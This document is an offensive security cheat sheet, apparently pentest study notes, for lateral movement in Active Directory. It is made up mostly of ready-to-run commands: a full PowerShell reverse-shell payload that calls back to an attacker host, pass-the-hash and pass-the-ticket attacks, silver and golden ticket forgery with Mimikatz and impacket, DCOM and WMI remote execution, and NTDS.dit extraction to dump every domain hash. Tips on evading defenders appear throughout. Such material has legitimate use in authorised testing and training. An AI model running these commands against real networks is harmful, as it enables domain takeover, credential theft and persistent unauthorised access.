---
sidebar_position: 1
title: Lateral Movement
---

# AD Lateral Movement

```bash
# Set environment variables
export TARGET=<ip>
export DOMAIN=<domain>
export USER=<username>
export PASSWORD=<password>
export LHOST=<your-ip>
export LPORT=4444
export HASH=<ntlm-hash>
```

---

## WMI (Windows Management Instrumentation)

Requires credentials for a user in the local Administrators group on the target. WMI uses DCOM (port 135) for remote access and dynamically assigns a high port for the session.

### wmic (CMD)

Create a process on the remote host:

```powershell
wmic /node:$TARGET /user:$USER /password:$PASSWORD process call create "calc"
```

:::tip
Processes created through WMI run in session 0 (background), not the user's interactive desktop. This means you won't see GUI applications — use it to launch reverse shells or command-line tools.
:::

### PowerShell CIM

Build a credential object and create a CIM session over DCOM:

```powershell
$username = '$USER';
$password = '$PASSWORD';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;

$Options = New-CimSessionOption -Protocol DCOM
$Session = New-CimSession -ComputerName $TARGET -Credential $credential -SessionOption $Options

$Command = 'powershell -nop -w hidden -e <base64-encoded-reverse-shell>';
Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
```

### Encoding a Reverse Shell for WMI

Use Python to base64-encode the PowerShell payload:

```python
import base64
payload = '$client = New-Object System.Net.Sockets.TCPClient("LHOST",LPORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
encoded = base64.b64encode(payload.encode('utf-16le')).decode()
print(encoded)
```

Replace `LHOST` and `LPORT` in the payload string with your actual values before encoding.

---

## WinRM

Uses WS-Management protocol over HTTP (port 5985) or HTTPS (port 5986). The target user must be in the Administrators or Remote Management Users group.

### winrs (CMD)

Execute a command on the remote host:

```powershell
winrs -r:$TARGET -u:$USER -p:$PASSWORD "cmd /c whoami"
```

Execute an encoded reverse shell:

```powershell
winrs -r:$TARGET -u:$USER -p:$PASSWORD "powershell -nop -w hidden -e <base64-payload>"
```

### PowerShell Remoting

Create and enter an interactive remote session:

```powershell
$credential = New-Object System.Management.Automation.PSCredential $USER, (ConvertTo-SecureString $PASSWORD -AsPlaintext -Force)
New-PSSession -ComputerName $TARGET -Credential $credential
Enter-PSSession <session-id>
```

Run a command on multiple machines at once:

```powershell
Invoke-Command -ComputerName $TARGET -Credential $credential -ScriptBlock { whoami; hostname }
```

### Evil-WinRM (From Kali)

Interactive shell with password:

```bash
evil-winrm -i $TARGET -u $USER -p $PASSWORD
```

Interactive shell with hash:

```bash
evil-winrm -i $TARGET -u $USER -H $HASH
```

Upload and download files from within Evil-WinRM:

```powershell
upload /home/kali/payload.exe C:\Users\Public\payload.exe
download C:\Users\Public\secret.txt /home/kali/loot/secret.txt
```

:::tip
Evil-WinRM supports loading PowerShell scripts with `-s /path/to/scripts/` and .NET binaries with `-e /path/to/binaries/`. This is useful for loading tools like PowerView or SharpHound directly into memory.
:::

---

## PsExec

Part of SysInternals suite. Prerequisites:
1. User must be in the local Administrators group
2. The `ADMIN$` share must be available
3. File and Printer Sharing must be enabled

PsExec writes `psexesvc.exe` to `C:\Windows`, creates a service, and runs the command as a child process. This generates significant event log noise.

SysInternals PsExec (from Windows):

```powershell
.\PsExec64.exe -i \\$TARGET -u $DOMAIN\$USER -p $PASSWORD cmd
```

### Impacket PsExec (From Kali)

With password:

```bash
impacket-psexec $DOMAIN/$USER:$PASSWORD@$TARGET
```

With hash:

```bash
impacket-psexec -hashes 00000000000000000000000000000000:$HASH $USER@$TARGET
```

### Other Impacket Execution Tools

Each tool uses a slightly different technique and leaves different forensic artifacts:

impacket-smbexec — creates a service that executes commands via a batch file, slightly stealthier than PsExec:

```bash
impacket-smbexec $DOMAIN/$USER:$PASSWORD@$TARGET
```

impacket-atexec — uses the Task Scheduler service for command execution:

```bash
impacket-atexec $DOMAIN/$USER:$PASSWORD@$TARGET "whoami"
```

:::tip
If one impacket tool fails (blocked by AV, service disabled, etc.), try another. They all achieve similar results through different mechanisms.
:::

---

## Pass the Hash (PtH)

Authenticate using NTLM hash without knowing the plaintext password. Works because NTLM authentication uses the hash directly — it never needs the plaintext.

Prerequisites: SMB port 445 open, File and Printer Sharing enabled, ADMIN$ share accessible, local admin rights on the target.

impacket-wmiexec with hash:

```bash
impacket-wmiexec -hashes 00000000000000000000000000000000:$HASH Administrator@$TARGET
```

NetExec with hash:

```bash
nxc smb $TARGET -u Administrator -H $HASH --shares
nxc smb $TARGET -u Administrator -H $HASH -x "whoami"
nxc winrm $TARGET -u Administrator -H $HASH -x "whoami"
```

:::tip
PtH works with local admin accounts and domain accounts that are members of the local Administrators group. Add `--local-auth` to NetExec if the hash belongs to a local-only account.
:::

---

## Overpass the Hash

Abuse an NTLM hash to obtain a full Kerberos TGT, then use that TGT to authenticate to services that only accept Kerberos. This converts an NTLM hash into Kerberos-based access.

### Mimikatz (From Windows)

Inject the NTLM hash into a new process and request a TGT:

```powershell
.\mimikatz.exe
privilege::debug
sekurlsa::pth /user:$USER /domain:$DOMAIN /ntlm:$HASH /run:powershell
```

This spawns a new PowerShell window running as the target user. Any Kerberos authentication from this shell will use the injected identity. The new shell won't show the spoofed user with `whoami` — but Kerberos tickets will be requested as that user.

Generate a TGT by accessing a network resource:

```powershell
net use \\dc01
```

Verify the TGT was cached:

```powershell
klist
```

Now you can use any Kerberos-authenticated tool (PsExec, WinRM, etc.) from this shell as the target user.

### impacket-getTGT (From Kali)

Request a TGT using the NTLM hash:

```bash
impacket-getTGT $DOMAIN/$USER -hashes 00000000000000000000000000000000:$HASH
```

Set the ticket for use:

```bash
export KRB5CCNAME=$USER.ccache
```

Use the ticket with other impacket tools:

```bash
impacket-psexec $DOMAIN/$USER@$TARGET -k -no-pass
impacket-wmiexec $DOMAIN/$USER@$TARGET -k -no-pass
impacket-smbexec $DOMAIN/$USER@$TARGET -k -no-pass
```

:::warning
When using `-k` (Kerberos auth) with impacket, you must use the target's hostname (not IP), and it must resolve correctly. Add entries to `/etc/hosts` if DNS isn't configured.
:::

---

## Pass the Ticket

Export a Kerberos ticket from one machine and import it on another. Unlike Overpass the Hash, you don't need the password hash — you just need access to an existing ticket.

### Export Tickets with Mimikatz

List all Kerberos tickets in memory:

```powershell
.\mimikatz.exe
privilege::debug
sekurlsa::tickets /export
```

This dumps `.kirbi` files to the current directory. Look for TGT tickets (`krbtgt`) for the most flexibility.

### Inject a Ticket with Mimikatz

Import a stolen ticket into the current session:

```powershell
kerberos::ptt <ticket-file>.kirbi
```

Verify the ticket is loaded:

```powershell
klist
```

### Rubeus (From Windows)

Dump all tickets from the current session:

```powershell
.\Rubeus.exe dump /nowrap
```

Inject a base64-encoded ticket:

```powershell
.\Rubeus.exe ptt /ticket:<base64-ticket>
```

### impacket-ticketConverter (From Kali)

Convert between `.kirbi` (Windows) and `.ccache` (Linux) formats:

```bash
impacket-ticketConverter ticket.kirbi ticket.ccache
impacket-ticketConverter ticket.ccache ticket.kirbi
```

Use the converted `.ccache` ticket:

```bash
export KRB5CCNAME=ticket.ccache
impacket-psexec $DOMAIN/$USER@$TARGET -k -no-pass
```

---

## DCOM (Distributed Component Object Model)

DCOM allows interaction with COM objects over the network. Requires local admin access on the target and TCP port 135 (plus dynamic high ports). Less commonly monitored than PsExec or WinRM.

### MMC20.Application Method

The `MMC20.Application` COM object exposes the `ExecuteShellCommand` method:

```powershell
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","$TARGET"))
$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e <base64-payload>","7")
```

### ShellWindows Method

Use the `ShellWindows` COM object as an alternative:

```powershell
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("Shell.Application.1","$TARGET"))
```

### From Kali with Impacket

impacket-dcomexec uses DCOM for command execution:

```bash
impacket-dcomexec $DOMAIN/$USER:$PASSWORD@$TARGET "whoami"
impacket-dcomexec -hashes 00000000000000000000000000000000:$HASH $USER@$TARGET
```

:::tip
DCOM is often overlooked by defenders. The traffic appears as standard RPC/DCOM calls, which are common in Active Directory environments. It's a good alternative when PsExec or WinRM are being monitored.
:::

---

## Silver Tickets

Forge a Kerberos service ticket (TGS) using the password hash of the service account (or machine account) running the target SPN. Since service tickets are encrypted with the service account's hash, anyone with that hash can forge a valid ticket.

Requirements:
1. SPN password hash (or machine account NTLM hash)
2. Domain SID
3. Target SPN string

### Get the Domain SID

From Windows:

```powershell
whoami /user
```

The domain SID is everything before the last `-<RID>` segment.

From Kali:

```bash
impacket-lookupsid $DOMAIN/$USER:$PASSWORD@$TARGET
```

### Mimikatz (From Windows)

Forge a silver ticket and inject it into the current session:

```powershell
.\mimikatz.exe
privilege::debug
kerberos::golden /sid:<domain-SID> /domain:$DOMAIN /target:<target-hostname> /service:HTTP /rc4:$HASH /user:$USER /ptt
```

Common service names: HTTP, CIFS, MSSQLSvc, HOST, LDAP, RPCSS, WSMAN.

Verify the ticket:

```powershell
klist
```

Access the service (e.g., web application with HTTP SPN):

```powershell
iwr -UseDefaultCredentials http://<target-hostname>
```

### impacket-ticketer (From Kali)

Forge a silver ticket and save as `.ccache`:

```bash
impacket-ticketer -nthash $HASH -domain-sid <domain-SID> -domain $DOMAIN -spn CIFS/$TARGET $USER
export KRB5CCNAME=$USER.ccache
impacket-psexec $DOMAIN/$USER@$TARGET -k -no-pass
```

:::warning
Since October 2022, Microsoft's PAC validation patch requires the PAC_REQUESTOR field to be validated by a domain controller. This means silver tickets for nonexistent users may fail if the target and KDC are in the same domain. Tickets for real domain users still work.
:::

---

## Golden Tickets

Forge a Kerberos TGT using the `krbtgt` account's NTLM hash. Since TGTs are encrypted with the `krbtgt` hash, possessing it means you can create TGTs for any user — including nonexistent users — with any group membership.

Requirements:
1. `krbtgt` NTLM hash (obtained via DC Sync or NTDS.dit extraction)
2. Domain SID
3. Domain name

### Mimikatz (From Windows)

Forge a golden ticket and inject it:

```powershell
.\mimikatz.exe
privilege::debug
kerberos::golden /user:Administrator /domain:$DOMAIN /sid:<domain-SID> /krbtgt:<krbtgt-hash> /ptt
```

After injection, open a new command prompt to use the ticket:

```powershell
misc::cmd
```

Verify access:

```powershell
dir \\dc01\C$
impacket-psexec $DOMAIN/Administrator@dc01 -k -no-pass
```

### impacket-ticketer (From Kali)

Forge a golden ticket:

```bash
impacket-ticketer -nthash <krbtgt-hash> -domain-sid <domain-SID> -domain $DOMAIN Administrator
export KRB5CCNAME=Administrator.ccache
impacket-psexec $DOMAIN/Administrator@$TARGET -k -no-pass
impacket-secretsdump $DOMAIN/Administrator@$TARGET -k -no-pass
```

:::tip
Golden tickets are valid for 10 years by default and survive password resets for all accounts except `krbtgt`. The only remediation is to reset the `krbtgt` password twice (once to invalidate current tickets, again because AD stores the current and previous password).
:::

---

## Shadow Copies

Volume shadow copies on domain controllers may contain the `NTDS.dit` database (all domain password hashes) and the SYSTEM registry hive (needed to decrypt NTDS.dit).

### Create a Shadow Copy

From a domain controller (requires admin access):

```powershell
vshadow.exe -nw -p C:
```

Or using `wmic`:

```powershell
wmic shadowcopy call create Volume='C:\'
```

### Copy NTDS.dit from Shadow Copy

List shadow copies:

```powershell
vssadmin list shadows
```

Copy NTDS.dit and SYSTEM hive from the shadow copy:

```powershell
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\Temp\NTDS.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\Temp\SYSTEM
```

### Extract Hashes (From Kali)

Transfer both files to Kali, then extract all domain hashes:

```bash
impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL
```

### ntdsutil (Alternative)

Use the built-in `ntdsutil` to create an IFM (Install From Media) backup that includes NTDS.dit:

```powershell
ntdsutil "activate instance ntds" "ifm" "create full C:\Temp\ntds_dump" quit quit
```

The NTDS.dit and SYSTEM hive will be in `C:\Temp\ntds_dump\Active Directory\` and `C:\Temp\ntds_dump\registry\`.

:::warning
Extracting NTDS.dit gives you every hash in the domain. This is extremely noisy — the shadow copy creation and ntdsutil usage are logged by default. Use DC Sync when possible for a stealthier approach.
:::
